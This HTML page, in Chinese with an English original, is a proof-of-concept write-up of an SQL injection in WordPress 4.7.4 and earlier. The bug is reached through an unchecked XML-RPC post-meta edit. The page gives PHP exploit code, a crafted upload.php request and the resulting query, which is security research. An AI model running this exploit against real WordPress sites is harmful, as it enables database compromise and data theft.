<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
	<head>
		<meta http-equiv="Content-Type" content="text/html; charset=utf-8" /><title>
		</title>
		<style type="text/css">
			.csAD577193{text-align:left;text-indent:0pt;margin:24pt 0pt 0pt 0pt;page-break-after:avoid;page-break-inside:avoid}
			.csDE05BCC{color:#4F81BD;background-color:transparent;font-family:Calibri;font-size:16pt;font-weight:bold;font-style:normal;}
			.csECDA2D3{color:#4F81BD;background-color:transparent;font-family:Microsoft YaHei UI;font-size:16pt;font-weight:bold;font-style:normal;}
			.cs868C439D{text-align:left;text-indent:0pt;margin:10pt 0pt 0pt 0pt;page-break-after:avoid;page-break-inside:avoid}
			.cs83F14626{color:#4F81BD;background-color:transparent;font-family:Microsoft YaHei UI;font-size:14pt;font-weight:bold;font-style:normal;}
			.csD6CA00D2{color:#4F81BD;background-color:transparent;font-family:Microsoft YaHei UI;font-size:12pt;font-weight:bold;font-style:normal;}
			.cs40DD2BC9{text-align:left;text-indent:0pt;margin:9pt 0pt 9pt 0pt}
			.cs9C1B1871{color:#000000;background-color:transparent;font-family:Microsoft YaHei UI;font-size:12pt;font-weight:normal;font-style:normal;}
			.cs8926E06{color:#000000;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:normal;font-style:normal;}
			.csD1E291E2{color:#4F81BD;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:bold;font-style:normal;}
			.cs3A447A38{text-align:left;text-indent:0pt;margin:0pt 0pt 10pt 0pt}
			.cs9FB05234{color:#000000;background-color:transparent;font-family:Consolas;font-size:11pt;font-weight:normal;font-style:normal;}
			.cs508254C{color:#000000;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:normal;font-style:normal;text-decoration: none;}
			.cs4B51D5E4{color:#4F81BD;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:normal;font-style:normal;}
			.csBF12A472{color:#4F81BD;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:normal;font-style:italic;}
			.cs24C36B3{text-align:left;margin:0pt 0pt 10pt 0pt;list-style-type:disc;color:#000000;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:normal;font-style:normal}
		</style>
	</head>
	<body>
		<h1 class="csAD577193">
			<a name="X7d1fc982b249e80d0df49d10da2d575c8ed40d2"><span class="csDE05BCC">Wordpress &lt;= 4.7.4 XML-RPC API POST META </span><span class="csECDA2D3">未校验漏洞</span></a></h1>
		<h2 class="cs868C439D">
			<a name="一、漏洞简介"><span class="cs83F14626">一、漏洞简介</span></a></h2>
		<h2 class="cs868C439D">
			<a name="二、漏洞影响"><span class="cs83F14626">二、漏洞影响</span></a></h2>
		<h2 class="cs868C439D">
			<a name="三、复现过程"><span class="cs83F14626">三、复现过程</span></a></h2>
		<h3 class="cs868C439D">
			<a name="中文版"><span class="csD6CA00D2">中文版</span></a></h3>
		<p class="cs40DD2BC9"><span class="cs9C1B1871">以作者身份登录到您的</span><span class="cs8926E06">wordpress</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">上传图片</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">记住图像</span><span class="cs8926E06">/</span><span class="cs9C1B1871">媒体的</span><span class="cs8926E06">ID</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">创建帖子并将图像设置为特色图像（这将创建</span><span class="cs8926E06">_thumbnail_id</span><span class="cs9C1B1871">帖子元）</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">记住帖子</span><span class="cs8926E06">ID</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">我们可以通过修改</span><span class="cs8926E06">_thumbnail_id</span><span class="cs9C1B1871">的值来编辑的值（</span><span class="cs8926E06">6</span><span class="cs9C1B1871">是帖子</span><span class="cs8926E06">ID</span><span class="cs9C1B1871">，</span><span class="cs8926E06">5</span><span class="cs9C1B1871">是图片</span><span class="cs8926E06">/</span><span class="cs9C1B1871">帖子</span><span class="cs8926E06">ID</span><span class="cs9C1B1871">）</span></p><h3 class="cs868C439D">
			<a name="poc"><span class="csD1E291E2">poc</span></a></h3>
		<p class="cs3A447A38"><span class="cs9FB05234">$usr = &#39;author&#39;;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">$pwd = &#39;author&#39;;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">$xmlrpc = &#39;http://local.target/xmlrpc.php&#39;;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">$client = new IXR_Client($xmlrpc);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">$content = array(&quot;ID&quot; =&gt; 6, &#39;meta_input&#39; =&gt; array(&quot;_thumbnail_id&quot;=&gt;&quot;xxx&quot;));</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">$res = $client-&gt;query(&#39;wp.editPost&#39;,0, $usr, $pwd, 6/*post_id*/, $content);</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">通过这段代码，我们在数据库中添加以下负载</span></p><p class="cs3A447A38"><span class="cs9FB05234">5 %1$%s hello</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">执行</span><span class="cs8926E06">SQL</span><span class="cs9C1B1871">负载</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">使用作者帐户登录管理面板，转到媒体，例如</span></p><p class="cs3A447A38"><span class="cs9FB05234">http://0-sec.org/wp-admin/upload.php</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">通过</span><span class="cs8926E06">_wpnonce</span><span class="cs9C1B1871">参数可以直接进行</span><span class="cs8926E06">sql</span><span class="cs9C1B1871">注入</span></p><p class="cs3A447A38"><span class="cs9FB05234">http://0-sec.org/wp-admin/upload.php?_wpnonce=daab7cfabf&amp;action=delete&amp;media%5B%5D=5%20%251%24%25s%20hello</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">其中</span><span class="cs8926E06">5 %1$%s hello</span><span class="cs9C1B1871">的</span><span class="cs8926E06">encode</span><span class="cs9C1B1871">编码是</span><span class="cs8926E06">5%20%251%24%25s%20hello</span><span class="cs9C1B1871">这个请求将导致数据库执行以下查询（会有错误）</span></p><p class="cs3A447A38"><span class="cs9FB05234">SELECT post_id FROM wp_postmeta WHERE meta_key = &#39;_thumbnail_id&#39; AND meta_value = &#39;5 _thumbnail_id&#39; hello&#39;</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">这证明了</span><span class="cs8926E06">Wordpress</span><span class="cs9C1B1871">中的</span><span class="cs8926E06">sql</span><span class="cs9C1B1871">漏洞，正如</span><span class="cs8926E06">5%1$%s</span><span class="cs9C1B1871">之后的前一个</span><span class="cs8926E06">post</span><span class="cs9C1B1871">值中提到的，</span><span class="cs8926E06">hello</span><span class="cs9C1B1871">就是我们的</span><span class="cs8926E06">payload</span></p><h3 class="cs868C439D">
			<a name="英文原文"><span class="csD6CA00D2">英文原文</span></a></h3>
		<p class="cs40DD2BC9"><span class="cs8926E06">In order to understand the writing here, you need to read the previous explanation <a class="cs508254C" href="https://medium.com/websec/wordpress-sqli-bbb2afcc8e94"><span class="cs4B51D5E4">https://medium.com/websec/wordpress-sqli-bbb2afcc8e94</span></a></span><span class="cs8926E06">. If you got it, then we can jump to the part and solve the question e.g. how to update / insert our sql payload into _thumbnail_id post meta.</span></p><h4 class="cs868C439D">
			<a name="poc-start"><span class="csBF12A472">PoC start</span></a></h4>
		<ul style="margin-top:0;margin-bottom:0;">
			<li class="cs24C36B3"><span class="cs8926E06">Login to your wordpress as author</span></li><li class="cs24C36B3"><span class="cs8926E06">Upload image</span></li><li class="cs24C36B3"><span class="cs8926E06">Remember ID of the image / media</span></li><li class="cs24C36B3"><span class="cs8926E06">Create post and set image as featured image (this creates _thumbnail_id post meta)</span></li><li class="cs24C36B3"><span class="cs8926E06">Remember the post ID</span></li></ul>
		<h4 class="cs868C439D">
			<a name="wordpress-≤-474-xml-rpc"><span class="csBF12A472">Wordpress &le; 4.7.4 XML-RPC</span></a></h4>
		<p class="cs40DD2BC9"><span class="cs8926E06">n case of appropriate wordpress version then we can use the third vulnerability in this versions of wordpress <a class="cs508254C" href="https://wordpress.org/news/2017/05/wordpress-4-7-5/"><span class="cs4B51D5E4">https://wordpress.org/news/2017/05/wordpress-4-7-5/</span></a></span><span class="cs8926E06"> e.g.</span></p><p class="cs3A447A38"><span class="cs9FB05234">Lack of capability checks for post meta data in the XML-RPC API.</span></p><p class="cs40DD2BC9"><span class="cs8926E06">This means that we can edit the value of _thumbnail_id with the following code ( 6 is the post ID and 5 is image/post ID )</span></p><p class="cs3A447A38"><span class="cs9FB05234">$usr = &#39;author&#39;;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">$pwd = &#39;author&#39;;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">$xmlrpc = &#39;http://local.target/xmlrpc.php&#39;;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">$client = new IXR_Client($xmlrpc);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">$content = array(&quot;ID&quot; =&gt; 6, &#39;meta_input&#39; =&gt; array(&quot;_thumbnail_id&quot;=&gt;&quot;5 %1$%s hello&quot;));</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">$res = $client-&gt;query(&#39;wp.editPost&#39;,0, $usr, $pwd, 6/*post_id*/, $content);</span></p><p class="cs40DD2BC9"><span class="cs8926E06">and with this code we add the following payload in the DB 5 %1$%s hello</span></p><h4 class="cs868C439D">
			<a name="X3bda81da29022d8e17cbeabfeeb9c4cfddcf220"><span class="csBF12A472">Wordpress importer plugin &mdash; any version of wordpress</span></a></h4>
		<p class="cs40DD2BC9"><span class="cs8926E06">This is another approach for changing the _thumbnail_id value in the database. If wordpress instance have enabled this plugin on it, then simple export, change meta value and import will do the job.</span></p><h4 class="cs868C439D">
			<a name="execute-the-sql-payload"><span class="csBF12A472">Execute the SQL payload</span></a></h4>
		<p class="cs40DD2BC9"><span class="cs8926E06">Login to the administration panel with your author account, go to media e.g. <a class="cs508254C" href="http://local.target/wp-admin/upload.php"><span class="cs4B51D5E4">http://local.target/wp-admin/upload.php</span></a></span><span class="cs8926E06"> , grab the _wpnonce value and we are ready to prove our SQLi vulnerability. Issue the following request towards your local instance:</span></p><p class="cs3A447A38"><span class="cs9FB05234">local.target/wp-admin/upload.php?_wpnonce=daab7cfabf&amp;action=delete&amp;media%5B%5D=5%20%251%24%25s%20hello</span></p><p class="cs40DD2BC9"><span class="cs8926E06">where 5%20%251%24%25s%20hello is url encoded 5 %1$%s hello. This request will result with execution of the following query against the DB (will rise error of course):</span></p><p class="cs3A447A38"><span class="cs9FB05234">SELECT post_id FROM wp_postmeta WHERE meta_key = &#39;_thumbnail_id&#39; AND meta_value = &#39;5 _thumbnail_id&#39; hello&#39;</span></p><p class="cs40DD2BC9"><span class="cs8926E06">This proves the SQLi vulnerability in the wordpress and as mention in previous post value after 5 %1$%s e.g. hello is our payload</span></p><h4 class="cs868C439D">
			<a name="is-this-vulnerability-dangerous"><span class="csBF12A472">Is this vulnerability dangerous?</span></a></h4>
		<p class="cs40DD2BC9"><span class="cs8926E06">SQL injection itself is quite dangerous vulnerability, but sometimes have its own limitations. Here at our case depending of the database server configuration or mysql client used on PHP side could be fatal, but in our case best case scenario would be blind sql injection. Sure, we all know the trivial attack vector, but here we have 2 facts that go against wordpress:</span></p><p class="cs40DD2BC9"><span class="cs8926E06">meta value database column type e.g. size constraint</span></p><p class="cs40DD2BC9"><span class="cs8926E06">media parameter could be POST parameter e.g. will have huge size</span></p><p class="cs40DD2BC9"><span class="cs8926E06">This two facts guide us to the conclusion that even with blind sqli one query would be enough to calculate some crucial DB cell value.</span></p></body>
</html>
